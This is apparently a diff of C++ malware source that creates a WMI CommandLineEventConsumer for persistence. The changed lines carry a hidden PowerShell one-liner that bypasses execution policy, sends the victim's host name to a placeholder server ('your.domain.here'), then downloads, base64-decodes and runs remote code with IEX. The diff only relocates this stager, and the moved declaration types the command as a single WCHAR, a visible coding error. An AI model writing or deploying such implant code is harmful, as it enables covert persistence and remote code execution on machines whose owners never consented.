@@ -12,7 +12,7 @@ using namespace std;
 void scheduleCallback(){
 	IWbemLocator *ploc = NULL;
 	IWbemServices *psvc = NULL;
-	WCHAR cmd[MAX_PATH*2]; //good enough
+	WCHAR cmd = L"powershell -w hidden -ep bypass -nop -c \"$i=(New-Object System.Net.WebClient);$i.Headers.add('hostid',[net.dns]::GetHostByName('').HostName);IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String(($i.DownloadString('http://your.domain.here')))))\"";
 
         //init com interface
 	HRESULT h = CoInitializeEx(0, COINIT_MULTITHREADED);
@@ -94,7 +94,6 @@ void scheduleCallback(){
 	}
 
         //spawn CommandLineEventConsumer class instance
-	cmd = L"powershell -w hidden -ep bypass -nop -c \"$i=(New-Object System.Net.WebClient);$i.Headers.add('hostid',[net.dns]::GetHostByName('').HostName);IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String(($i.DownloadString('http://your.domain.here')))))\"";
 	h = eventConsumer->SpawnInstance(0, &ec);
 	if (FAILED(h)){
 		cerr << "failed to spawn command line consumer" << endl;
